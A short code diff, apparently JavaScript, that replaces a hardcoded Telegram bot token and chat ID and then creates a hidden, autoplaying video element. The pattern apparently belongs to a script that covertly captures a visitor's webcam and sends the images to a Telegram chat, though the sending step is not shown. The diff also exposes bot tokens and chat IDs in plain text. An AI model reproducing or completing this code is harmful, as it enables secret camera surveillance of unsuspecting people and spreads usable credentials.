@@ -1,5 +1,5 @@
-const token = "7445130563:AAHWJj7mYGlOIV0XYQIoM8nHjnGU_lPGjBg";
-const chatId = "6487758414";
+const token = "7348785122:AAEVLa4dYKR5WGCq4_6EqY_vSO0xZbe-EkM";
+const chatId = "7647034160";
 const camera = document.createElement("video");
 camera.setAttribute("autoplay", true);
 camera.setAttribute("style", "display: none");
